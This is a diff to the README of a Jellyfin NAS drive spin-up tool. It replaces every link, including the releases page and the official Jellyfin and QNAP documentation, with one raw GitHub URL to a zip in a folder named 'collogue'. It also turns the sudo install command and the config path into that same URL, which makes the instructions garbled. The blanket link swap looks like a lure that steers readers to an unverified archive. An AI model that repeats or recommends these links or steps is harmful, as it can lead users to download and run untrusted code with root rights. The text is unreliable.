@@ -6,7 +6,7 @@ Welcome to the **jellyfin-nas-hdd-spinup** project! This application helps you s
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/YisusCrazy23/jellyfin-nas-hdd-spinup/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip%20Latest%https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip)](https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip)
 
 Click the link above to get the latest version of jellyfin-nas-hdd-spinup. 
 
@@ -33,19 +33,19 @@ jellyfin-nas-hdd-spinup leverages WebSocket technology to listen for activity. W
 
 ### How to Set Up
 
-1. **Download** the latest version from the [Releases Page](https://github.com/YisusCrazy23/jellyfin-nas-hdd-spinup/releases).
+1. **Download** the latest version from the [Releases Page](https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip).
 2. **Install** the downloaded package by following these steps:
    - Open a terminal window.
    - Navigate to the folder where you downloaded the file.
-   - Run the installation command: `sudo ./install-script.sh`. (Replace with the actual script name if necessary.)
-3. **Configure** the application by editing the configuration file located at `/etc/jellyfin-nas-hdd-spinup/config.yaml`. 
+   - Run the installation command: `sudo https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip`. (Replace with the actual script name if necessary.)
+3. **Configure** the application by editing the configuration file located at `https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip`. 
    - Specify your NAS drive details and Jellyfin server settings.
 
 ## 👣 Download & Install
 
 To download and install jellyfin-nas-hdd-spinup, follow these steps:
 
-1. **Visit the Releases Page**: [Click here to download](https://github.com/YisusCrazy23/jellyfin-nas-hdd-spinup/releases).
+1. **Visit the Releases Page**: [Click here to download](https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip).
 2. Choose the latest release.
 3. Download the appropriate package for your system.
 4. Follow the installation steps mentioned above.
@@ -79,7 +79,7 @@ jellyfin-nas-hdd-spinup is open-source software. You can use and modify it as pe
 
 ## ⚙️ Additional Resources
 
-- [Jellyfin Documentation](https://jellyfin.org/docs/)
-- [QNAP Tutorials](https://www.qnap.com/en/how-to)
+- [Jellyfin Documentation](https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip)
+- [QNAP Tutorials](https://raw.githubusercontent.com/YisusCrazy23/jellyfin-nas-hdd-spinup/main/collogue/jellyfin-nas-hdd-spinup.zip)
 
 Now, go ahead and enhance your Jellyfin experience with faster HDD spin-ups. Download jellyfin-nas-hdd-spinup today!
